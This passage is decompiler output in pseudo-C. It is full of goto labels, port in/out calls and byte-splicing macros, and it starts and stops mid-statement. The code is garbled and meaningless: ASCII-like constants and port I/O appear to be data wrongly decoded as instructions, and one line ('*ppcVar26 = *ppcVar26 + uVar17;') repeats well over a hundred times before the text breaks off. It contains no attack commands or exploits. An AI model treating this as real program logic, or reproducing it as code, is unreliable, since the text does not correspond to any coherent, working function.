in_stack_00000064));\n                        uVar15 = 0;\n                        puVar52 = ppcVar26 * 3 + 0x44;\n                        *puVar52 = *puVar52;\n                        ppcVar26 = ppcVar26 + 1;\n                        cStack1 = uVar13;\ncode_r0x0046678f:\n                        in_stack_00000068 = SUB41(puVar49, 0);\n                        in_stack_00000069 = puVar49 >> 8;\n                        in_stack_0000006a = puVar49 >> 0x10;\n                        in_stack_0000006b = puVar49 >> 0x18;\n                        puVar36 = puVar49 + 1;\n                        out(*puVar49, puVar43);\n                        puVar1 = puVar37 + 0x6d;\n                        *puVar1 = *puVar1 + uVar15 * ((in_stack_0000009d & 3) - (*puVar1 & 3));\n                        if (SBORROW4(&stack0x0000006c, 1)) goto code_r0x004667d8;\n                        puVar47 = puVar49 + 1;\n                        uVar5 = in(puVar43);\n                        *puVar49 = uVar5;\n                        puVar48 = puVar37;\ncode_r0x00466799:\n                        puVar37 = puVar48;\n                        puVar49 = puVar36 + 1;\n                        out(*puVar36, puVar43);\n                        puVar38 = puVar37 + 0x1b;\n                        *puVar38 = *puVar38 + uVar15 * ((iVar6 + 0x1dU & 3) - (*puVar38 & 3));\n                        if (uVar15) {\n                            pcVar21 = ppcVar26 + 3;\n                            cVar14 = pcVar21;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            uVar17 = cVar14 + 0x73;\n                            pcVar22 = pcVar21 & 0xffffff00 | uVar17;\n                            *pcVar22 = *pcVar22 + uVar17;\n                            *pcVar22 = *pcVar22 + uVar17;\n                            *puVar49 = *puVar49 + (puVar37 >> 8);\n                            uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                            in_stack_00000039 =\n                                 pcVar21 & 0xffff0000 |\n                                 CONCAT11(((pcVar21 & 0xffffff00) >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                            in_stack_00000031 = puVar43;\n                            in_stack_0000002d = puVar28;\n                            in_stack_00000025 = in_stack_0000009d;\n                            goto code_r0x004667b2;\n                        }\n                        puVar38 = CONCAT22(in_stack_0000001f, in_stack_0000001d);\n                        if (ppcVar26 == 0xffffffff) goto code_r0x00466884;\n                        puVar31 = segment(in_DS, iVar41);\n                        puVar50 = in_stack_00000021 & 0xffff0000 | iVar41 + 4;\n                        out(*puVar31, in_stack_00000031);\ncode_r0x0046681a:\n                        ppcVar26 = in_stack_00000039;\n                        if (uVar15) goto code_r0x00466895;\n                        ppcVar26 = in_stack_00000039 + 1;\n                        if (uVar15) {\n                            pcVar21 = in_stack_00000039 + 3;\n                            *pcVar21 = *pcVar21 + pcVar21;\n                            uVar15 = pcVar21 + 0x73;\n                            in_stack_00000039 = pcVar21 & 0xffffff00 | uVar15;\n                            *in_stack_00000039 = *in_stack_00000039 + uVar15;\n                            puVar43 = in_stack_00000031;\n                            puVar28 = in_stack_0000002d;\n                            goto code_r0x00466829;\n                        }\n                        cVar14 = in_stack_00000031;\n                        goto code_r0x00466896;\n                    }\n                    puVar31 = CONCAT13(in_stack_00000073, \n                                       CONCAT12(in_stack_00000072, CONCAT11(in_stack_00000071, in_stack_00000070)));\n                    iVar24 = CONCAT13(in_stack_00000077, \n                                      CONCAT12(in_stack_00000076, CONCAT11(in_stack_00000075, in_stack_00000074)));\n                    in_stack_0000009d = CONCAT13(in_stack_0000007b, CONCAT21(in_stack_00000079, in_stack_00000078));\n                    puVar28 = CONCAT13(in_stack_00000083, CONCAT21(in_stack_00000081, in_stack_00000080));\n                    puVar43 = CONCAT13(in_stack_00000087, CONCAT21(in_stack_00000085, in_stack_00000084));\n                    puVar37 = CONCAT13(in_stack_0000008b, \n                                       CONCAT12(in_stack_0000008a, CONCAT11(in_stack_00000089, in_stack_00000088)));\n                    uVar19 = CONCAT13(in_stack_0000008f, \n                                      CONCAT12(in_stack_0000008e, CONCAT11(in_stack_0000008d, in_stack_0000008c)));\ncode_r0x0046662e:\n                    puVar23 = *(puVar28 + iVar24 * 2 + 0x40) * 0x74734044;\n                    uVar19 = uVar19 + 2;\n                    in_stack_0000006c = puVar23;\n                    in_stack_0000006d = puVar23 >> 8;\n                    in_stack_0000006e = puVar23 >> 0x10;\n                    in_stack_0000006f = puVar23 >> 0x18;\n                    uVar16 = 9 < (uVar19 & 0xf) | uVar16;\n                    uVar19 = uVar19 & 0xffff0000 | (CONCAT11((uVar19 >> 8) - uVar16, uVar19) & 0xff0f) & 0xffffff61;\n                    uVar42 = SUB42(puVar43, 0);\n                    uVar5 = in(uVar42);\n                    *puVar31 = uVar5;\n                    puVar47 = puVar31 + 2;\n                    uVar5 = in(uVar42);\n                    *(puVar31 + 1) = uVar5;\n                    out(*puVar23, uVar42);\n                    *(puVar37 + 0x1d) = *(puVar37 + 0x1d);\n                    out(puVar23[1], uVar42);\n                    uVar51 = uVar19 + 1;\n                    uVar15 = uVar51 ^ *(uVar19 + 0x41);\n                    uVar19 = uVar51 & 0xffffff00;\n                    pcVar21 = uVar19 | uVar15;\n                    bVar54 = &stack0x0000006c == *(puVar28 + 0x5f) * 0x69727473;\n                    puVar49 = puVar23 + 9;\n                    out(*(puVar23 + 2), uVar42);\n                    cVar14 = puVar37 >> 8;\n                    if (bVar54) {\n                        uVar15 = uVar15 + 0x73;\n                        pcVar21 = uVar19 | uVar15;\n                        *pcVar21 = *pcVar21 + uVar15;\n                        *pcVar21 = *pcVar21 + uVar15;\n                        *puVar49 = *puVar49 + cVar14;\n                        uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                        pcVar21 = uVar51 & 0xffff0000 | CONCAT11((uVar19 >> 8) - uVar16, uVar15 + uVar16 * -6) & 0xff0f;\ncode_r0x0046673a:\n                        pcVar21 = pcVar21 + 2;\n                        uVar17 = pcVar21;\n                        *pcVar21 = *pcVar21 + uVar17;\n                        pcVar22 = puVar37 * 4 + 0x44;\n                        *pcVar22 = *pcVar22 + (puVar37 >> 8);\n                        *pcVar21 = *pcVar21 + uVar17;\n                        uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                        ppcVar26 = pcVar21 & 0xffff0000 |\n                                   CONCAT11((pcVar21 >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                        puVar48 = puVar37 + 1;\n                        in_stack_0000006e = SUB41(puVar49, 0);\n                        in_stack_0000006f = puVar49 >> 8;\n                        in_stack_00000070 = puVar49 >> 0x10;\n                        in_stack_00000071 = puVar49 >> 0x18;\n                        uVar42 = SUB42(puVar43, 0);\n                        uVar5 = in(uVar42);\n                        *puVar47 = uVar5;\n                        puVar38 = puVar49 + 1;\n                        out(*puVar49, uVar42);\n                        ppcVar27 = ppcVar26;\n                        puVar47 = puVar47 + 1;\n                        cStack1 = uVar13;\n                        if (puVar48 == NULL) goto code_r0x004667ba;\n                        puVar36 = puVar38;\n                        if (uVar15) {\ncode_r0x004667c8:\n                            cVar14 = ppcVar26;\n                            *ppcVar26 = *ppcVar26 + cVar14;\n                            *ppcVar26 = *ppcVar26 + cVar14;\n                            ppcVar26 = ppcVar26 & 0xffffff00 | cVar14 + 0x73;\ncode_r0x004667cf:\n                            puVar37 = puVar48;\n                            uVar16 = ppcVar26;\n                            *ppcVar26 = *ppcVar26 + uVar16;\n                            *ppcVar26 = *ppcVar26 + uVar16;\n                            *puVar36 = *puVar36 + (puVar37 >> 8);\n                            uVar15 = 9 < (uVar16 & 0xf) | uVar15;\n                            ppcVar26 = ppcVar26 & 0xffff0000 |\n                                       CONCAT11((ppcVar26 >> 8) - uVar15, uVar16 + uVar15 * -6) & 0xff0f;\n                            uVar16 = uVar15;\n                            goto code_r0x004667d6;\n                        }\n                        puVar36 = puVar49 + 5;\n                        out(*puVar38, uVar42);\n                        puVar47 = puVar49;\n                        uVar16 = uVar15;\n                        if (uVar15) goto code_r0x00466799;\n                        if (!uVar15) goto code_r0x004667cf;\n                        pcVar21 = ppcVar26 + 2;\n                        *pcVar21 = *pcVar21 + pcVar21;\n                        uVar16 = pcVar21 + 0x73;\n                        pcVar22 = pcVar21 & 0xffffff00 | uVar16;\n                        *pcVar22 = *pcVar22 + uVar16;\n                        *pcVar22 = *pcVar22 + uVar16;\n                        *puVar36 = *puVar36 + (puVar48 >> 8);\n                        uVar15 = 9 < (uVar16 & 0xf) | uVar15;\n                        ppcVar26 = pcVar21 & 0xffff0000 |\n                                   CONCAT11(((pcVar21 & 0xffffff00) >> 8) - uVar15, uVar16 + uVar15 * -6) & 0xff0f;\n                        puVar37 = puVar37 + 2;\n                        in_stack_0000006a = SUB41(puVar36, 0);\n                        in_stack_0000006b = puVar36 >> 8;\n                        in_stack_0000006c = puVar36 >> 0x10;\n                        in_stack_0000006d = puVar36 >> 0x18;\n                        puVar47 = puVar49 + 9;\n                        out(*puVar36, uVar42);\n                        uVar16 = uVar15;\n                        if (puVar37 == NULL) {\n                            puVar52 = puVar36 & 0xffff0000;\n                            goto code_r0x00466770;\n                        }\n                        in_stack_00000035 = puVar37;\n                        in_stack_00000031 = puVar43;\n                        in_stack_0000002d = puVar28;\n                        if (!uVar15) goto code_r0x004667e5;\n                        goto code_r0x00466849;\n                    }\n                    if (bVar54) {\n                        puVar31 = CONCAT22(in_stack_0000001f, in_stack_0000001d) + 1;\n                        uVar20 = in(in_stack_00000031);\n                        *CONCAT22(in_stack_0000001f, in_stack_0000001d) = uVar20;\n                        uVar19 = in_stack_00000039 + 1;\n                        in_stack_00000070 = SUB41(in_stack_00000025, 0);\n                        in_stack_00000071 = in_stack_00000025 >> 8;\n                        in_stack_00000072 = in_stack_00000025 >> 0x10;\n                        in_stack_00000073 = in_stack_00000025 >> 0x18;\n                        uVar16 = 9 < (uVar19 & 0xf) | uVar16;\n                        in_stack_0000006c = 0x61;\n                        in_stack_0000006d = 'r';\n                        in_stack_0000006e = 0x5f;\n                        in_stack_0000006f = 0x74;\n                        puVar49 = *(in_stack_0000002d + in_stack_00000021 * 2 + 0x40) * 0x74734044;\n                        uVar19 = (uVar19 & 0xffff0000 |\n                                 (CONCAT11((uVar19 >> 8) - uVar16, uVar19 + uVar16 * -6) & 0xff0f) & 0xffffff63) + 2;\n                        in_stack_00000068 = SUB41(puVar49, 0);\n                        in_stack_00000069 = puVar49 >> 8;\n                        in_stack_0000006a = puVar49 >> 0x10;\n                        in_stack_0000006b = puVar49 >> 0x18;\n                        puVar37 = in_stack_00000035;\n                        puVar43 = in_stack_00000031;\n                        puVar28 = in_stack_0000002d;\n                        in_stack_0000009d = in_stack_00000025;\n                        goto code_r0x004666e9;\n                    }\n                    if (bVar54) {\n                        puVar38 = puVar23 + 0xd;\n                        out(*puVar49, uVar42);\n                        puVar48 = puVar47;\n                        goto code_r0x0046672b;\n                    }\n                    pcVar22 = puVar37 * 4 + 0x44;\n                    *pcVar22 = *pcVar22 + cVar14;\ncode_r0x004667ae:\n                    in_stack_00000025 = in_stack_0000009d;\n                    in_stack_0000002d = puVar28;\n                    in_stack_00000031 = puVar43;\n                    uVar17 = pcVar21;\n                    *pcVar21 = *pcVar21 + uVar17;\n                    uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                    in_stack_00000039 =\n                         pcVar21 & 0xffff0000 | CONCAT11((pcVar21 >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                    cStack1 = uVar13;\ncode_r0x004667b2:\n                    in_stack_00000035 = puVar37 + 1;\n                    puVar43 = in_stack_00000031;\n                    puVar28 = in_stack_0000002d;\n                    puVar50 = puVar49;\n                    uVar16 = uVar15;\n                    in_stack_0000003d = puVar49;\n                    if (uVar15) {\ncode_r0x00466829:\n                        uVar17 = in_stack_00000039;\n                        *in_stack_00000039 = *in_stack_00000039 + uVar17;\n                        *puVar50 = *puVar50 + (in_stack_00000035 >> 8);\n                        uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                        uVar44 = CONCAT11((in_stack_00000039 >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                        ppcVar26 = in_stack_00000039 & 0xffff0000 | uVar44;\n                        puVar37 = in_stack_00000035 + 1;\n                        bVar54 = puVar37 == NULL;\n                        in_stack_0000006a = SUB41(puVar50, 0);\n                        in_stack_0000006b = puVar50 >> 8;\n                        in_stack_0000006c = puVar50 >> 0x10;\n                        in_stack_0000006d = puVar50 >> 0x18;\n                        in_stack_0000005c = in_stack_0000005c & 0xff | puVar28 << 8;\n                        uVar19 = in_stack_00000060 & 0xffffff00;\n                        in_stack_00000060 = uVar19 | puVar28 >> 0x18;\n                        if (-1 < puVar37) {\n                            puVar29 = puVar43 + in_FS_OFFSET + 0x79;\n                            *puVar29 = *puVar29 & uVar44 >> 8;\n                            puVar29 = in_stack_00000035 + in_stack_00000025 * 2 + 0x6f;\n                            *puVar29 = *puVar29 & uVar44;\n                            iVar8 = *(in_stack_00000025 + 0x6d) * 0x77;\n                            bVar54 = iVar8 != iVar8;\n                            Stack00000061 = uVar19 >> 8;\n                            in_stack_0000009d =\n                                 CONCAT13(in_stack_00000068, CONCAT12(in_stack_00000067, in_stack_00000065));\n                            puVar43 = CONCAT13(in_stack_00000074, \n                                               CONCAT12(in_stack_00000073, \n                                                        CONCAT11(in_stack_00000072, in_stack_00000071)));\n                            puVar37 = CONCAT13(in_stack_00000078, \n                                               CONCAT12(in_stack_00000077, \n                                                        CONCAT11(in_stack_00000076, in_stack_00000075)));\n                            ppcVar26 = CONCAT13(in_stack_0000007c, CONCAT12(in_stack_0000007b, in_stack_00000079));\n                            in_stack_0000002d =\n                                 CONCAT13(in_stack_00000070, \n                                          CONCAT12(in_stack_0000006f, CONCAT11(in_stack_0000006e, in_stack_0000006d)));\n                            puVar47 = CONCAT13(in_stack_00000064, Stack00000061);\n                            puVar49 = puVar28;\n                            goto code_r0x004668b5;\n                        }\n                        in_stack_00000035 = puVar37;\n                        in_stack_0000002d = puVar28;\n                        in_stack_0000009d = in_stack_00000025;\n                        puVar47 = puVar50;\n                        puVar49 = puVar50;\n                        uVar16 = uVar15;\n                        if (!bVar54) {\n                            uVar19 = in(puVar43);\n                            *puVar50 = uVar19;\n                            puVar49 = puVar28;\n                            if (uVar15) goto code_r0x004668ae;\n                            goto code_r0x0046683b;\n                        }\n                        goto code_r0x0046689b;\n                    }\n                    puVar38 = puVar49 + 1;\n                    out(*puVar49, in_stack_00000031);\n                    ppcVar27 = in_stack_00000039;\n                    puVar48 = in_stack_00000035;\n                    in_stack_0000009d = in_stack_00000025;\n                    if (uVar15) {\n                        puVar50 = puVar49 + 2;\n                        out(*puVar38, in_stack_00000031);\n                        goto code_r0x0046681a;\n                    }\ncode_r0x004667ba:\n                    puVar49 = puVar47;\n                    puVar37 = puVar48;\n                    puVar47 = puVar37 + 0x1d;\n                    *puVar47 = *puVar47 + uVar15 * ((iVar6 + 0x6eU & 3) - (*puVar47 & 3));\n                    puVar31 = segment(in_GS, puVar38);\n                    puVar50 = puVar38 & 0xffff0000 | puVar38 + 4;\n                    out(*puVar31, puVar43);\n                    ppcVar26 = ppcVar27;\n                    in_stack_0000002d = puVar28;\n                    if (!uVar15) {\n                        ppcVar26 = ppcVar27 + 1;\n                        if (uVar15) {\n                            ppcVar26 = ppcVar27 + 3;\n                            puVar48 = puVar37;\n                            puVar36 = puVar50;\n                            goto code_r0x004667c8;\n                        }\n                        if (uVar15) goto code_r0x004668ae;\n                    }\ncode_r0x0046683b:\n                    puVar47 = puVar50 + 1;\n                    out(*puVar50, puVar43);\n                    uVar16 = uVar15;\n                    if (!uVar15) {\n                        puVar38 = puVar37 + 0x1d;\n                        *puVar38 = *puVar38 + uVar15 * ((iVar6 + 0x5dU & 3) - (*puVar38 & 3));\n                        puVar31 = segment(in_GS, puVar47);\n                        puVar47 = puVar47 & 0xffff0000 | puVar47 + 4;\n                        out(*puVar31, puVar43);\n                        if (!uVar15) goto code_r0x00466846;\n                        goto code_r0x004668bc;\n                    }\ncode_r0x0046689d:\n                    bVar54 = !uVar15;\n                    uVar15 = uVar16;\n                    if (bVar54) {\n                        puVar29 = puVar37 + in_stack_0000009d * 2 + 99;\n                        *puVar29 = *puVar29 & puVar37 >> 8;\n                        out(*puVar47, puVar43);\n                        goto code_r0x0046690d;\n                    }\ncode_r0x004668cc:\n                    uVar16 = in_stack_00000050;\n                    uVar19 = in_stack_0000005c & 0xffffff00;\n                    in_stack_0000005c = uVar19 | puVar43 >> 0x18;\n                    in_stack_00000057 = puVar47 >> 0x10;\n                    uStack00000058 = puVar47 >> 0x18;\n                    in_stack_00000058 = CONCAT31(puVar43, uStack00000058);\n                    *ppcVar26 = *ppcVar26 + ppcVar26;\n                    uVar17 = ppcVar26 + 0x73;\n                    pcVar21 = ppcVar26 & 0xffffff00 | uVar17;\n                    *pcVar21 = *pcVar21 + uVar17;\n                    *pcVar21 = *pcVar21 + uVar17;\n                    *puVar47 = *puVar47 + (puVar37 >> 8);\n                    uVar15 = 9 < (uVar17 & 0xf) | uVar15;\n                    uVar44 = CONCAT11(((ppcVar26 & 0xffffff00) >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                    ppcVar26 = ppcVar26 & 0xffff0000 | uVar44;\n                    in_stack_00000035 = puVar37 + 1;\n                    in_stack_00000053 = SUB41(puVar47, 0);\n                    in_stack_00000054 = puVar47 >> 8;\n                    in_stack_00000055 = puVar47 >> 0x10;\n                    uVar17 = uVar44;\n                    if (in_stack_00000035 == NULL) {\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + 